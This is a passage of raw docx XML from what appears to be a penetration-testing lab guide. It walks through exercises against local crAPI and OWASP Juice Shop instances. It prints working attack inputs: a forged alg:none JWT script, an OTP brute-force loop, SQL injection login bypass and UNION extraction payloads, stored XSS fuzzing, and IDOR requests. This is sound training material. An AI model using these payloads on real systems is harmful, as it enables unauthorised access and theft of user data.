          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>HIT: OTP=0009 — {"message":"OTP is valid","status":200}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>3.5.5  Exercise 3 — JWT alg:none Bypass (API2:2023)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TOKEN=$(python3 -c "</w:t>
        <w:br/>
        <w:t>import json, base64</w:t>
        <w:br/>
        <w:t>def b64u(data):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if isinstance(data, str): data = data.encode()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()</w:t>
        <w:br/>
        <w:t>header  = json.dumps({'alg':'none'}, separators=(',',':'))</w:t>
        <w:br/>
        <w:t>payload = json.dumps({'sub':'admin@admin.com','iat':1773607237,'exp':1774212037,'role':'user'}, separators=(',',':'))</w:t>
        <w:br/>
        <w:t>print(f'{b64u(header)}.{b64u(payload)}.')</w:t>
        <w:br/>
        <w:t>")</w:t>
        <w:br/>
        <w:br/>
        <w:t>curl -s http://localhost:8888/identity/api/v2/user/dashboard \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{ "email": "admin@admin.com", "available_credit": 100.0 }  &lt;- victim's data</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>3.5.6  Exercise 4 — Excessive Data Exposure (API3:2023)</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-s 'http://localhost:8888/community/api/v2/community/posts/recent' \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{ "email": "robot001@example.com", "vehicleid": "4bae9968..." }  &lt;- not shown in UI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="320" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="7B3F00"/>
        </w:rPr>
        <w:t>Module 4 — Manual Penetration Testing (Burp Suite)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Manual penetration testing of OWASP Juice Shop using Burp Suite Community Edition. Five exercises covering proxy setup, SQL injection, XSS payload fuzzing with wordlists, and IDOR. Target: http://localhost:3000. Proxy: 127.0.0.1:8080.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>4.1  Exercise 1 — Proxy Setup &amp; Traffic Interception</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Configure Firefox to route all traffic through Burp Suite's proxy listener.</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Open Burp Suite → Proxy → Options → confirm listener is on 127.0.0.1:8080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Open Firefox → Settings → Network Settings → Manual proxy → HTTP: 127.0.0.1, Port: 8080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Clear the 'No proxy for:' field — remove localhost and 127.0.0.1 (critical — see roadblock below)</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 Burp: Proxy → Intercept → click 'Intercept is off' so it toggles to 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Navigate to http://localhost:3000 in Firefox — Burp should freeze the page</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6</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Click Forward in Burp to release the request. Traffic now flows through Burp.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="12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Firefox not intercepting localhost:3000:  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Firefox has a built-in proxy bypass for localhost and 127.0.0.1. Even with proxy configured, requests to localhost never go through Burp. Fix: Firefox Settings → Network Settings → Manual proxy → clear the 'No proxy for:' field completely (remove localhost, 127.0.0.1).</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Burp's built-in browser shows DVWA instead of Juice Shop:  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Burp's built-in Chromium resolves localhost differently on macOS. Stick with Firefox (Option A) throughout Module 4 — do not use Burp's built-in browser.</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HTTP History only shows GET requests, no POST:  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Juice Shop is an Angular SPA — logins use XHR/fetch in the background, not traditional form POSTs. These may not appear in HTTP History due to timing or filters. Solution: build requests manually in Repeater (see Exercise 4.2).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>4.2  Exercise 2 — SQL Injection Authentication Bypass</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Bypass the Juice Shop login without valid credentials using a SQL injection payload.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Build the request manually in Burp Repeater — do not rely on HTTP History capture:</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POST /rest/user/login HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: localhost:3000</w:t>
        <w:br/>
        <w:t>Content-Type: application/json</w:t>
        <w:br/>
        <w:br/>
        <w:t>{"email":"' OR 1=1--","password":"anything"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>HTTP/1.1 200 OK</w:t>
        <w:br/>
        <w:t>{ "authentication": { "token": "eyJ0eX...", "bid": 1, "umail": "admin@juice-sh.op" } }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>The token returned here is your JWT. Copy it — you will need it for all subsequent requests.</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400 Bad Request when trying SQLi on login:  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>The login endpoint validates input more strictly in some Juice Shop versions. If you get 400, the ' OR 1=1-- payload still works — ensure the Content-Type header is application/json and the payload is properly JSON-escaped.</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408 Request Timeout:  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>HTTP/1.1 requires a blank line after the last header to signal end of headers. If you get 408, press Enter twice after the Content-Type line in Repeater before the body.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>4.3  Exercise 3 — UNION-Based SQL Injection (Data Extraction)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Extract the entire Users table by injecting a UNION SELECT into the product search endpoint.</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Why the search endpoint?  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>The search endpoint /rest/products/search?q= is injectable and returns results in the response body, making it ideal for UNION-based extraction. The login endpoint does not reflect query results in the same way.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pP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/rest/products/search?q='))UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users-- HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: localhost:3000</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>HTTP/1.1 200 OK</w:t>
        <w:br/>
        <w:t>{ "data": [</w:t>
        <w:br/>
        <w:t xml:space="preserve">  { "id":1, "name":"Apple Juice (1000ml)", ... },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  { "id":1, "name":"admin@juice-sh.op", "description":"0192023a7bbd73250516f069df18b500" },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  { "id":2, "name":"jim@juice-sh.op",   "description":"e541ca7ecf72b8d1286474fc613e5e45" },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ... (22 users total)</w:t>
        <w:br/>
        <w:t>]}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>22 user accounts extracted including emails and MD5-hashed passwords.</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Burp Configure Target dialog shows 'Invalid host: localhost:3000':  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>When pasting a raw request, Burp sometimes sets Host to 'localhost:3000' with port 443 and HTTPS. Fix: in the Configure Target dialog, set Host to 'localhost', Port to 3000, uncheck 'Use HTTPS'.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>4.4  Exercise 4 — Stored XSS via Product Review (Burp Intruder + Wordlist)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Inject XSS payloads into the product review endpoint and fuzz with a wordlist.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:spacing w:before="160" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
        </w:rPr>
        <w:t>Step 1 — Get the XSS wordlist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="595959"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  Terminal  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:before="0" w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="D4D4D4"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -o ~/XSS-payloads.txt \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt'</w:t>
        <w:br/>
        <w:t>wc -l ~/XSS-payloads.txt  # should show ~3000 lines</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curl returns 14 bytes (404 Not Found):  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>SecLists reorganised its XSS lists into subfolders. The file is now at: Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt — not Fuzzing/XSS/XSS-Jhaddix.txt. Use the full path shown in the command above.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:spacing w:before="160" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
        </w:rPr>
        <w:t>Step 2 — Confirm the review endpoint works in Repeater first</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PUT /rest/products/1/reviews HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: localhost:3000</w:t>
        <w:br/>
        <w:t>Content-Type: application/json</w:t>
        <w:br/>
        <w:t>Authorization: Bearer &lt;your_JWT_token&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t>{"message":"test","author":"admin@juice-sh.op"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>HTTP/1.1 201 Created</w:t>
        <w:br/>
        <w:t>{"status":"success"}</w:t>
      </w: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500 Internal Server Error: Unexpected path:  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>The review endpoint uses PUT not POST. Change the method to PUT in Repeater.</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CE4D6"/>
            <w:tcMar>
              <w:top w:w="100" w:type="dxa"/>
              <w:bottom w:w="100" w:type="dxa"/>
              <w:left w:w="160" w:type="dxa"/>
              <w:right w:w="160" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve">ROADBLOCK — 401 Unauthorized: invalid signature:  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>JWT tokens expire after ~7 days. Re-run the login request (Exercise 4.2) to get a fresh token and replace it in the Authorization header.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:spacing w:before="160" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
        </w:rPr>
        <w:t>Step 3 — Send to Intruder and load wordlist</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Step</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="468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Action</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1</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Right-click in Repeater request panel → Send to Intruder</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2</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 Intruder → Positions tab → click Clear §</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3</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Highlight the word 'test' in the message field → click Add § → it becomes §test§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4</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In Intruder → Payloads tab → click Load → navigate to ~/XSS-payloads.txt</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5</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9FBFD"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Fix Target: change http://localhost:80 to http://localhost:3000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4680"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D6E4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pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2E75B6"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="468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shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Click Start Attack — dismiss the Community Edition throttle warning</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Results window: all ~3000 payloads return HTTP 201 Created</w:t>
        <w:br/>
        <w:t>Payloads accepted include: &lt;script&gt;alert(1)&lt;/script&gt;, &lt;img src=x onerror=alert(1)&gt;, &lt;svg onload=...&gt;, etc.</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Why no alert() popup?  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Juice Shop's Angular frontend applies DomSanitizer which escapes HTML on render. The server-side vulnerability is confirmed (201 for all payloads, raw HTML stored in DB). Any non-Angular consumer of this data (admin panel, email, mobile app) would execute the scripts. The critical finding is server-side acceptance without input validation.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>4.5  Exercise 5 — IDOR: Access Any User's Basket</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Insecure Direct Object Reference — access another user's basket by changing the ID in the URL.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="595959"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  Burp Repeater  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:before="0" w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="D4D4D4"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>GET /rest/basket/1 HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: localhost:3000</w:t>
        <w:br/>
        <w:t>Authorization: Bearer &lt;your_JWT_token&gt;</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>HTTP/1.1 200 OK</w:t>
        <w:br/>
        <w:t>{ "data": { "id": 1, "UserId": 1, "Products": [ Apple Juice x2, Orange Juice x3 ... ] } }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Now change /rest/basket/1 to /rest/basket/2 and send:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>HTTP/1.1 200 OK</w:t>
        <w:br/>
        <w:t>{ "data": { "id": 2, "UserId": 2, "Products": [ Raspberry Juice x2 ] } }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>IDOR confirmed — logged in as UserId 1 (admin) but reading UserId 2's basket. No authorisation check.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="9360"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAF0F8"/>
            <w:tcMar>
              <w:top w:w="100" w:type="dxa"/>
              <w:bottom w:w="100" w:type="dxa"/>
              <w:left w:w="160" w:type="dxa"/>
              <w:right w:w="160" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2E75B6"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve">Real-world impact:  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Basket IDs are sequential integers. An attacker iterates /rest/basket/1 through /rest/basket/N to enumerate every user's shopping contents. Replace sequential IDs with UUIDs and add server-side ownership validation to remediate.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>4.6  Module 4 — Summary of Findings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Exercise</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Finding</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Severity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="234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Status</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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4.2</w:t>
            </w:r>
          </w:p>
        </w:tc>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SQLi Authentication Bypass</w:t>
            </w:r>
          </w:p>
        </w:tc>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CRITICAL</w:t>
            </w:r>
          </w:p>
        </w:tc>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SQLi UNION Data Extraction (22 users)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CRITICAL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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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4.4</w:t>
            </w:r>
          </w:p>
        </w:tc>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Stored XSS — Product Reviews</w:t>
            </w:r>
          </w:p>
        </w:tc>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HIGH</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2340"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>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IDOR — Basket API</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E26B0A"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>HIGH</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Confirmed</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="320" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>Quick Reference — All Key Commands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Command</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Purpose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3000:3000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Juice Shop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M1</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-d -p 8080:80 vulnerables/web-dvwa</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DVWA</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bandit -r . -f txt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Python SAST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semgrep --config=auto .</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Multi-lang SAST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trivy image bkimminich/juice-shop</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Container SCA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M2</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osv-scanner -r .</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OSV SCA scan</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run ghcr.io/zaproxy/zaproxy:stable zap-baseline.py -t &lt;url&gt;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ZAP passive scan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docker compose up -d  (in module-3.5-api-security/)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Start crAPI</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.../identity/api/v2/vehicle/&lt;uuid&gt;/location -H 'Bearer $TOKEN2'</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BOLA test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for otp in $(seq -w 0000 9999); do ... /v2/check-otp ...; done</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OTP brute force</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M3.5</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python3 -c '...alg:none JWT...' → curl dashboard</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JWT alg:none bypass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POST /rest/user/login  body: {"email":"' OR 1=1--"}</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SQLi auth bypass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/rest/products/search?q='))UNION SELECT id,email,password,...</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UNION data extraction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curl -o ~/XSS-payloads.txt https://.../robot-friendly/XSS-Jhaddix.txt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Download XSS wordlist</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PUT /rest/products/1/reviews  body: {"message":"&lt;payload&gt;"}</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Stored XSS injection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GET /rest/basket/2  (while logged in as user 1)</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IDOR basket access</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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M4</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Burp Intruder: load ~/XSS-payloads.txt → §message§ position</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F0F4FA"/>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Fuzz with wordlist</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2E75B6"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>All</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rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>git add &lt;paths&gt; &amp;&amp; git commit -m 'msg' &amp;&amp; git push origin main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18"/>
              </w:rPr>
              <w:t>Push to GitHub</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="240"/>
      </w:pPr>
